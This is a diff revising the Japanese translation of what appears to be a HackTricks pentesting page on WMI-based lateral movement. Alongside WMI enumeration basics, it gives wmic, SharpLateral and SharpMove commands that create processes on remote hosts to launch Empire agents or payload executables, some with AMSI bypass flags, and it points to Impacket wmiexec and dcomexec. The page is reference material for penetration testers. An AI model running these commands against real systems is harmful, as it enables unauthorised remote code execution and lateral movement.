@@ -4,16 +4,16 @@
 
 ## 仕組みの説明
 
-WMIを使用すると、ユーザー名とパスワードまたはハッシュのいずれかが既知であるホスト上で、プロセスを起動できます。WmiexecはWMIを使用してコマンドを実行し、semi-interactive shellのような操作環境を提供します。
+ユーザー名とパスワードまたはハッシュのいずれかが判明している場合、WMIを使用してホスト上のプロセスを開くことができます。WmiexecはWMIを使用してコマンドを実行し、セミインタラクティブなシェル環境を提供します。
 
-**dcomexec.py:** このスクリプトは、異なるDCOMエンドポイントを利用して、wmiexec.pyに似たsemi-interactive shellを提供します。具体的には、ShellBrowserWindow DCOM objectを利用します。現在、MMC20.Application、Shell Windows、Shell Browser Window objectsをサポートしています。(source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>
+**dcomexec.py:** 異なるDCOMエンドポイントを使用し、このスクリプトは`wmiexec.py`に類似したセミインタラクティブなシェルを提供します。選択した`-object`の値によってエンドポイントが決まり、サポートされているオブジェクトには`MMC20.Application`、`ShellWindows`、`ShellBrowserWindow`があります。後者は、元のwalkthroughで取り上げられているShell Browser Window techniqueを提供します。<sup>[[2]](#references)[[3]](#references)</sup>
 
 ## WMIの基礎
 
 ### Namespace
 
-ディレクトリ形式の階層構造で編成されており、WMIの最上位コンテナは\rootです。その配下には、namespaceと呼ばれる追加のディレクトリが整理されています。<sup>[[1]](#references)</sup>
-Namespaceを一覧表示するコマンド:
+ディレクトリ形式の階層として構成されるWMIの最上位コンテナーは\rootで、その下にnamespaceと呼ばれる追加のディレクトリが整理されています。<sup>[[1]](#references)</sup>
+Namespaceを一覧表示するコマンド：
 ```bash
 # Retrieval of Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
@@ -24,15 +24,15 @@ Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | s
 # Listing of namespaces within "root\cimv2"
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
-namespace 内のクラスは、次の方法で一覧表示できます:
+namespace 内のクラスは、次のように一覧表示できます。
 ```bash
 gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **クラス**
 
-`win32_process` などの WMI クラス名と、そのクラスが存在する namespace を把握することは、あらゆる WMI 操作に不可欠です。  
-`win32` で始まるクラスを一覧表示するコマンド：
+win32_process などの WMI class 名と、それが存在する namespace を知ることは、あらゆる WMI 操作に不可欠です。  
+`win32` で始まる class を一覧表示するコマンド:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
@@ -43,9 +43,9 @@ gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
 Get-WmiObject -Class win32_share
 Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
 ```
-### メソッド
+### Methods
 
-WMI クラスの 1 つ以上の実行可能な関数であるメソッドを実行できます。
+WMI classesの1つ以上の実行可能なfunctionであるMethodsは、実行可能です。
 ```bash
 # Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
@@ -61,7 +61,7 @@ Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Descrip
 
 ### WMI Service Status
 
-WMI service が稼働しているか確認するための Commands:
+WMI serviceが稼働しているか確認するコマンド:
 ```bash
 # WMI service status check
 Get-Service Winmgmt
@@ -69,9 +69,9 @@ Get-Service Winmgmt
 # Via CMD
 net start | findstr "Instrumentation"
 ```
-### System と Process Information
+### システムおよびプロセス情報
 
-WMI を通じた system および process information の収集：
+WMIを介してシステムおよびプロセス情報を収集する：
 ```bash
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
@@ -85,21 +85,21 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-特定の情報（ローカル管理者やログオン中のユーザーなど）を取得するための WMI のリモートクエリは、コマンドを慎重に構築すれば実行可能です。
+特定の情報（local admins や logged-on users など）を対象とした WMI の remote querying は、コマンドを慎重に構築することで実行できます。
 
-### **手動によるリモート WMI クエリ**
+### **Manual Remote WMI Querying**
 
-特定の WMI クエリを使用することで、リモートマシン上のローカル管理者やログオン中のユーザーをステルスに特定できます。`wmic` はテキストファイルから読み込んで、複数のノード上で同時にコマンドを実行することもサポートしています。<sup>[[1]](#references)</sup>
+remote machine 上の local admins と logged-on users を stealthy に特定するには、特定の WMI queries を使用します。`wmic` は text file から読み込んで、複数の nodes 上で同時に commands を実行することもサポートしています。<sup>[[1]](#references)</sup>
 
-Empire agent のデプロイなど、WMI 経由でプロセスをリモート実行するには、次のコマンド構造を使用します。実行が成功すると、戻り値として "0" が返されます。<sup>[[1]](#references)</sup>
+WMI 経由で process を remotely execute するには、たとえば Empire agent を deploy する場合、以下の command structure を使用します。実行が成功すると、return value は "0" になります。<sup>[[1]](#references)</sup>
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-このプロセスは、WMIのリモート実行およびシステム列挙の機能を示しており、システム管理とpentestingの両方における有用性を強調しています。
+このプロセスは、WMIのリモート実行およびシステム列挙機能を示しており、システム管理とpentestingの両方における有用性を強調しています。
 
 ## Automatic Tools
 
-- [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
+- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
@@ -115,13 +115,12 @@ SharpMove.exe action=query computername=remote.host.local query="select * from w
 SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
 SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
 ```
-- **Impacketの `wmiexec`** も使用できます。
+- **Impacket の `wmiexec`**を使用することもできます。
 
 
-## 参考資料
+## References
 
-- [1] [Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
-- [2] [Beginner's Guide to Impacket Tool Kit - Part 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
-
-
+- [1] [Credentials を使用して Windows マシンを掌握する - Part 3（WMI と WinRM）](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
+- [2] [Fortra Impacket - dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
+- [3] [Impacket Tool Kit 初心者向けガイド、Part 1 - Hacking Articles（Internet Archive）](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
 {{#include ../../banners/hacktricks-training.md}}
